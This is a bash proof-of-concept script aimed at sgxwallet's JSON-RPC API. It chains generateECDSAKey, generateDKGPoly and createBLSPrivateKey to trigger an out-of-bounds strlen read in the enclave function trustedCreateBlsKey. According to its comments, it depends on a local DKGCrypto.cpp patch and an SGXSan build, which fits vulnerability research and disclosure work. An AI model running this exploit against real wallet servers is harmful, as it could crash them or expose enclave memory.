#!/bin/bash
# PoC: trustedCreateBlsKey strlen OOB Read
# 启动服务: ./sgxwallet -n -V -y
# 运行方式: bash poc_strlen_oob.sh [host] [port]

HOST=${1:-localhost}
PORT=${2:-1029}
URL="http://${HOST}:${PORT}"

rpc() {
    curl -s --max-time 5 -X POST "$URL" \
        -H 'Content-Type: application/json' \
        --data-binary @-
}

check() {
    local rsp=$1 step=$2
    if [[ -z "$rsp" ]]; then
        echo "[!] $step: no response (server down or crashed)"
        exit 1
    fi
    if echo "$rsp" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if d.get('result',{}).get('status',0)==0 else 1)" 2>/dev/null; then
        :
    else
        echo "[!] $step failed: $rsp"
        exit 1
    fi
}

echo "[*] Target: $URL"

# Step 1: 生成 ECDSA key
echo "[*] Step 1: generateECDSAKey ..."
RSP=$(rpc <<'EOF'
{"jsonrpc":"2.0","id":1,"method":"generateECDSAKey","params":{}}
EOF
)
echo "    $RSP"
check "$RSP" "generateECDSAKey"
ETH_KEY=$(echo "$RSP" | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['keyName'])")
echo "    ethKeyName = $ETH_KEY"

# Step 2: 生成 DKG poly
# polyName 格式: POLY:SCHAIN_ID:<num>:NODE_ID:<num>:DKG_ID:<num>
POLY_NAME="POLY:SCHAIN_ID:1:NODE_ID:1:DKG_ID:1"
echo "[*] Step 2: generateDKGPoly ..."
RSP=$(rpc <<EOF
{"jsonrpc":"2.0","id":2,"method":"generateDKGPoly","params":{"polyName":"$POLY_NAME","t":1}}
EOF
)
echo "    $RSP"
check "$RSP" "generateDKGPoly"

# Step 3: createBLSPrivateKey → 触发 strlen OOB
# secretShare = 192 个 'A'，通过服务器 length == n*192 校验
# DKGCrypto.cpp patch 将实际传入 enclave 的替换为 6145 字节无 null 缓冲区
SECRET=$(printf 'A%.0s' {1..192})
BLS_KEY_NAME="BLS_KEY:SCHAIN_ID:1:NODE_ID:1:DKG_ID:1"

echo "[*] Step 3: createBLSPrivateKey (triggering strlen OOB) ..."
echo "    blsKeyName  = $BLS_KEY_NAME"
echo "    ethKeyName  = $ETH_KEY"
echo "    polyName    = $POLY_NAME"
echo "    secretShare = 'A' * 192  (passes server check)"
echo "    [!] DKGCrypto.cpp patch sends 6145 bytes of 0x41 (no null) to enclave"

RSP=$(rpc <<EOF
{
    "jsonrpc": "2.0",
    "id": 3,
    "method": "createBLSPrivateKey",
    "params": {
        "blsKeyName":  "$BLS_KEY_NAME",
        "ethKeyName":  "$ETH_KEY",
        "polyName":    "$POLY_NAME",
        "secretShare": "$SECRET",
        "t": 1,
        "n": 1
    }
}
EOF
)

if [[ -z "$RSP" ]]; then
    echo "[!] No response — server likely crashed (SGXSan heap-buffer-overflow)"
    echo "    Check sgxwallet stderr for crash report"
else
    echo "[*] Server response: $RSP"
    STATUS=$(echo "$RSP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('result',{}).get('status','?'))" 2>/dev/null)
    if [[ "$STATUS" == "0" ]]; then
        echo "[+] OOB read was silent (no sanitizer) — num_shares inflated inside enclave"
        echo "    Enclave read beyond s_shares buffer boundary without crashing"
    else
        echo "[-] Server returned error status=$STATUS"
        echo "    (enclave may have caught OOB via CHECK_STATUS, or session_key_recover failed)"
    fi
fi
